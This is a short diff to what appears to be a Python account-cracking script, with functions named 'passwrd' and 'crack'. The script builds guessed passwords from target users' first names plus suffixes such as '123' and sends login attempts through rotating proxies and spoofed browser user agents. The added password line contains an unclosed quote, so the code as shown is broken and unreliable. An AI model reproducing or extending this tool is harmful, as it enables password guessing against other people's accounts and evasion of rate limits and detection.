@@ -915,7 +915,7 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(nmf)
+					pwv.append(frs+'123)
 					if 'ya' in pwpluss:
 						for xpwd in pwnya:
 							pwv.append(xpwd)
@@ -951,7 +951,7 @@ def crack(idf,pwv,nmf):
 	pers = loop*100/len(id2)
 	fff = '%'
 	ua = random.choice(ugen)
-#	ua='Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-F900U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36'
+#	ua='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36'
 	ua2 = random.choice(ugen2)
 	nip=random.choice(prox)
 	ses=requests.Session()
